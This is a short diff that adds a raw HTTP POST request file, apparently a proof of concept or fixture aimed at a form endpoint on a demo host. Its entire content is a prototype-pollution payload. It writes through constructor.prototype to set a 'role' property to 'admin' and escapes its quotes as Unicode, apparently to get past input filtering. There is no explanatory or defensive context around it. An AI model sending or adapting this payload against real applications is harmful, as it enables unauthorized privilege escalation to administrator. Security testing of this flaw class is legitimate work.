@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 89
+Connection: close
+
+id={\u0022constructor\u0022:{\u0022prototype\u0022:{\u0022role\u0022:\u0022admin\u0022}}}
